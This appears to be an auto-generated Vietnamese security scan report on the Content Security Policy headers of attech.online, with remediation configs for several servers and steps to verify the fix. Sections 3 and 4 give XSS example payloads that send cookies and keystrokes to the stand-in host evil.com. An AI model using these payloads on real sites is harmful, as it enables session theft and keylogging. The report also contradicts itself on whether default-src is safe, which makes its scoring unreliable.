# 🛡️ Phân biệt kỹ thuật: "Content Security Policy (CSP) Not Implemented"

**Ngày phân tích:** 13/11/2025 20:43:51  
**Website:** https://attech.online  
**Domain:** attech.online  
**Phân loại:** 🔴 Vulnerability Detected

---

## 🚀 Quick Test Commands (Copy & Paste)

### Test nhanh bằng curl (10 giây):

```bash
# Test CSP header
curl -I https://attech.online | grep -i "content-security-policy"

# Test đầy đủ các security headers
curl -I https://attech.online | grep -i "content-security\|x-frame\|x-content-type"
```

**Kết quả tốt (có CSP):**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'none'
```

**Kết quả xấu (không có CSP):**
```
(không có output - thiếu CSP header)
```

### Verify sau khi fix:

```bash
# 1. Kiểm tra CSP header
curl -I https://attech.online | grep -i "content-security-policy"

# 2. Test bằng online tool
# https://csp-evaluator.withgoogle.com/
# https://securityheaders.com/?q=https://attech.online

# 3. Scan lại bằng tool này
python3 scanCSP.py https://attech.online
```

---

## 📚 1. Tham chiếu chuẩn kỹ thuật

- **OWASP Top 10 2021:** A05:2021 – Security Misconfiguration
- **CWE-693:** Protection Mechanism Failure
- **CSP Level 3:** W3C Recommendation
- **OWASP Secure Headers Project:** Content-Security-Policy

### CSP là gì?

**Content Security Policy (CSP)** là cơ chế bảo mật giúp phát hiện và giảm thiểu các cuộc tấn công:
- **XSS (Cross-Site Scripting)** - Tấn công chèn script độc
- **Data Injection** - Chèn dữ liệu độc hại
- **Code Injection** - Thực thi mã không mong muốn

CSP hoạt động bằng cách cho phép website chỉ định **nguồn tin cậy** mà trình duyệt được phép tải tài nguyên.

**Ví dụ:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.jsdelivr.net
```
→ Chỉ cho phép tải script từ cùng domain hoặc từ cdn.jsdelivr.net

---

## 🧪 2. Kết quả kiểm tra thực tế

### Test 1: GET Request & Headers

```bash
curl -I https://attech.online
```

**Phản hồi:**

```http
HTTP/1.1 200 OK
Server: nginx/1.29.3
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: https: http:; connect-src ...
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

### ✅ CSP Header được tìm thấy

**Full CSP Header:**
```
default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: https: http:; connect-src 'self' https://api.attech.online ws: wss:; font-src 'self' data: https://fonts.gstatic.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com; frame-src https://www.youtube.com https://maps.google.com; frame-ancestors 'none';
```

### 📋 Các CSP Directives:

| Directive | Values | Status |
|-----------|--------|--------|
| `default-src` | `'self' 'unsafe-inline' 'unsafe-eval'` | ⚠️ YẾU |
| `img-src` | `'self' data: https: http:` | ✅ TỐT |
| `connect-src` | `'self' https://api.attech.online ws: wss:` | ✅ TỐT |
| `font-src` | `'self' data: https://fonts.gstatic.com https://cdnjs.cloudflare.com` | ✅ TỐT |
| `style-src` | `'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com` | ⚠️ YẾU |
| `frame-src` | `https://www.youtube.com https://maps.google.com` | ✅ TỐT |
| `frame-ancestors` | `'none'` | ✅ TỐT |

---

## 📊 3. So sánh: Có CSP vs Không có CSP

### ❌ Trường hợp KHÔNG CÓ CSP (nguy hiểm):

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Type: text/html
(Không có Content-Security-Policy header)
```

**Rủi ro thực tế:**

1. **XSS Attack - Tấn công chèn script:**
   ```javascript
   // Attacker có thể chèn script độc vào comment/input
   <script>
     // Đánh cắp cookie
     fetch('https://evil.com?cookie=' + document.cookie);
     
     // Hoặc keylogging
     document.addEventListener('keypress', e => {
       fetch('https://evil.com/log?key=' + e.key);
     });
   </script>
   ```

2. **Data Exfiltration:**
   - Attacker có thể tải script từ bất kỳ nguồn nào
   - Đánh cắp dữ liệu nhạy cảm (token, password, thông tin cá nhân)

3. **Malicious Redirect:**
   - Chuyển hướng người dùng đến trang phishing
   - Tải malware từ CDN độc hại

### ✅ Trường hợp HIỆN TẠI (có CSP):

```http
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self' 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: https: http:; connect-src 'se...
```

**Bảo vệ hiện tại:**
- ✅ Có default-src directive
- ✅ default-src được cấu hình an toàn
- ✅ Có frame-ancestors (chống Clickjacking)

**Vấn đề cần khắc phục:**
- ⚠️ Thiếu script-src directive


---

## 🎯 4. Demo tấn công XSS khi không có CSP

### Kịch bản 1: Reflected XSS

```html
<!-- Website vulnerable (không có CSP) -->
<!-- URL: https://victim.com/search?q=<script>alert('XSS')</script> -->

<!-- Attacker gửi link độc hại: -->
https://victim.com/search?q=<script>
  fetch('https://evil.com/steal?data=' + document.cookie)
</script>

<!-- Khi người dùng click, cookie bị đánh cắp ngay lập tức -->
```

### Kịch bản 2: Stored XSS

```html
<!-- Attacker post comment với script độc -->
<img src=x onerror="
  // Keylogger
  document.onkeypress = function(e) {
    fetch('https://evil.com/log', {
      method: 'POST',
      body: JSON.stringify({key: e.key})
    });
  }
">

<!-- Tất cả user xem comment đều bị keylog -->
```

### Kịch bản 3: DOM-based XSS

```javascript
// Code vulnerable
const searchTerm = window.location.hash.substring(1);
document.getElementById('result').innerHTML = searchTerm;

// Attacker tạo URL:
https://victim.com/#<img src=x onerror="fetch('https://evil.com/cookie?'+document.cookie)">
```

**Với CSP được cấu hình đúng → TẤT CẢ CÁC TẤN CÔNG TRÊN BỊ CHẶN**

---

## 📋 5. Bảng đánh giá bảo vệ

| Tiêu chí | Kết quả | Đánh giá | Điểm |
|----------|---------|----------|------|
| CSP Header | ✅ CÓ | Có header CSP | 30/30 |
| default-src | ✅ CÓ | ✅ An toàn | 20/20 |
| script-src | ❌ THIẾU | Rất quan trọng | 0/25 |
| frame-ancestors | ✅ CÓ | Chống Clickjacking | 10/10 |
| object-src | ❌ THIẾU | Nên disable | 0/10 |

**Tổng điểm bảo vệ:** 60/100

⚠️ **Đánh giá:** BẢO VỆ TRUNG BÌNH - Cần tăng cường

### Vấn đề phát hiện:

- ❌ Thiếu script-src directive

### Điểm mạnh:

- ✅ Có default-src directive
- ✅ default-src được cấu hình an toàn
- ✅ Có frame-ancestors (chống Clickjacking)


---

## 🔧 6. Biện pháp khắc phục

### 🔴 CẦN KHẮC PHỤC NGAY

### Step 1: CSP Cơ bản (Bắt đầu ở đây)

**Nginx:**
```nginx
# /etc/nginx/sites-available/your-site
server {
    ...
    # CSP cơ bản nhất - chỉ cho phép tài nguyên từ cùng domain
    add_header Content-Security-Policy "default-src 'self'; frame-ancestors 'none';" always;
}
```

**Apache:**
```apache
# .htaccess hoặc httpd.conf
Header always set Content-Security-Policy "default-src 'self'; frame-ancestors 'none';"
```

**Next.js:**
```javascript
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; frame-ancestors 'none';"
          }
        ]
      }
    ]
  }
}
```

**Express.js:**
```javascript
// app.js
const helmet = require('helmet');
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    frameAncestors: ["'none'"]
  }
}));
```

### Step 2: CSP Nâng cao (Có CDN/External resources)

```nginx
# Nginx - CSP với CDN
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https:;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
" always;
```

### Step 3: CSP Report-Only (Test trước khi áp dụng)

```nginx
# Test CSP mà không block - chỉ report vi phạm
add_header Content-Security-Policy-Report-Only "
  default-src 'self';
  script-src 'self';
  report-uri /csp-violation-report;
" always;
```

**Setup report endpoint:**
```javascript
// Express.js - CSP violation reporter
app.post('/csp-violation-report', express.json({type: 'application/csp-report'}), (req, res) => {
  console.log('CSP Violation:', req.body);
  // Log to monitoring service
  res.status(204).end();
});
```

### Step 4: CSP với Nonce (Khuyến nghị cho SPA/Dynamic sites)

```javascript
// Next.js với CSP nonce
// middleware.ts
import { NextResponse } from 'next/server';
import crypto from 'crypto';

export function middleware(request) {
  const nonce = crypto.randomBytes(16).toString('base64');
  
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
    style-src 'self' 'nonce-${nonce}';
    object-src 'none';
    base-uri 'self';
    frame-ancestors 'none';
  `;
  
  const response = NextResponse.next();
  response.headers.set('Content-Security-Policy', cspHeader.replace(/\s{2,}/g, ' ').trim());
  response.headers.set('x-nonce', nonce);
  
  return response;
}
```

```jsx
// Component sử dụng nonce
import { headers } from 'next/headers';

export default function Page() {
  const nonce = headers().get('x-nonce');
  
  return (
    <>
      <script nonce={nonce}>
        {`console.log('This script is allowed');`}
      </script>
    </>
  );
}
```

### ⚠️ Lưu ý quan trọng:

1. **Test kỹ trước khi deploy:**
   ```bash
   # Dùng Report-Only mode trước
   curl -I your-site.com | grep -i "content-security-policy-report-only"
   ```

2. **Kiểm tra không ảnh hưởng tính năng:**
   - Inline scripts sẽ bị block → Dùng nonce hoặc chuyển ra external files
   - Google Analytics, Facebook Pixel → Thêm domain vào script-src
   - YouTube embed → Thêm vào frame-src

3. **Common pitfalls:**
   ```nginx
   # ❌ SAI - Quá mở
   Content-Security-Policy: default-src *;
   
   # ❌ SAI - Unsafe
   Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval';
   
   # ✅ ĐÚNG - Strict nhưng functional
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xxx';
   ```

---

## ✅ 7. Kiểm tra lại sau khi khắc phục

### Bước 1: Kiểm tra bằng curl

```bash
# Kiểm tra CSP header
curl -I https://attech.online | grep -i "content-security-policy"
# Kết quả mong đợi: Content-Security-Policy: default-src 'self'...
```

### Bước 2: Test với Browser DevTools

1. Mở https://attech.online trong Chrome
2. F12 → Console
3. Thử chạy inline script:
```javascript
// Nếu CSP hoạt động, sẽ bị block với lỗi:
eval('alert("test")'); 
// ❌ Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source
```

4. Kiểm tra Network tab:
   - Reload trang
   - Click vào request đầu tiên
   - Tab "Headers" → tìm "Content-Security-Policy"

### Bước 3: Test với online tools

```bash
# Google CSP Evaluator
https://csp-evaluator.withgoogle.com/

# Copy CSP header vào và kiểm tra
# Tool sẽ highlight các vấn đề và đề xuất cải thiện

# SecurityHeaders.com
https://securityheaders.com/?q=https://attech.online

# Mozilla Observatory
https://observatory.mozilla.org/analyze/attech.online
```

### Bước 4: Test report endpoint (nếu có)

```bash
# Tạo test violation
curl -X POST https://attech.online/csp-violation-report \
  -H "Content-Type: application/csp-report" \
  -d '{
    "csp-report": {
      "blocked-uri": "https://evil.com/script.js",
      "violated-directive": "script-src"
    }
  }'

# Kiểm tra logs xem có nhận được report không
```

### Bước 5: Scan lại bằng tool này

```bash
python3 scanCSP.py https://attech.online
# Điểm protection score phải >= 70
```

---

## 📊 8. Kết luận và khuyến nghị

### Đánh giá tổng quan:

🔴 **Website CÓ LỖ HỔNG CSP**

**Điểm bảo vệ:** 60/100
**Mức độ rủi ro:** Medium
**CVSS Score:** 4.3

**Vấn đề phát hiện:**
- ❌ Thiếu script-src directive

**Tác động:**
- Dễ bị tấn công XSS (Cross-Site Scripting)
- Attacker có thể inject và thực thi script độc
- Đánh cắp cookie, session token, thông tin nhạy cảm
- Vi phạm OWASP Top 10 (A05:2021)

**Hành động khuyến nghị:**
1. 🔴 **KHẨN CẤP** - Triển khai CSP ngay (Step 1 → Step 2 trong mục 6)
2. 🧪 **TEST KỸ** - Dùng Report-Only mode trước khi enable chính thức
3. ✅ **VERIFY** - Scan lại bằng tool và online services
4. 📊 **MONITOR** - Setup CSP violation reporting


---

## 📖 9. CSP Directives Reference

### Các directive quan trọng:

| Directive | Mô tả | Ví dụ |
|-----------|-------|-------|
| `default-src` | Nguồn mặc định cho tất cả | `'self'` |
| `script-src` | Nguồn cho JavaScript | `'self' https://cdn.com` |
| `style-src` | Nguồn cho CSS | `'self' 'unsafe-inline'` |
| `img-src` | Nguồn cho images | `'self' data: https:` |
| `font-src` | Nguồn cho fonts | `'self' https://fonts.gstatic.com` |
| `connect-src` | Nguồn cho AJAX/WebSocket | `'self' https://api.com` |
| `frame-src` | Nguồn cho iframes | `'self' https://youtube.com` |
| `frame-ancestors` | Ai được phép embed | `'none'` hoặc `'self'` |
| `object-src` | Nguồn cho plugins | `'none'` (khuyến nghị) |
| `base-uri` | Giới hạn <base> element | `'self'` |
| `form-action` | Nguồn cho form submit | `'self'` |

### Các keyword đặc biệt:

- `'none'` - Không cho phép bất kỳ nguồn nào
- `'self'` - Chỉ cho phép cùng origin
- `'unsafe-inline'` - Cho phép inline scripts (KHÔNG KHUYẾN NGHỊ)
- `'unsafe-eval'` - Cho phép eval() (KHÔNG KHUYẾN NGHỊ)
- `'strict-dynamic'` - Tin tưởng scripts được load bởi trusted scripts
- `'nonce-xxx'` - Chỉ cho phép scripts với nonce này
- `'sha256-xxx'` - Chỉ cho phép scripts với hash này

---

## 🔗 References

- [CSP Level 3 Spec](https://www.w3.org/TR/CSP3/)
- [MDN - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Google CSP Guide](https://web.dev/csp/)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---

**Prepared by:** CSP Security Scanner  
**Scan Time:** 2025-11-13 20:43:51  
**Report Version:** 1.0  
**Tool Version:** 1.0.0
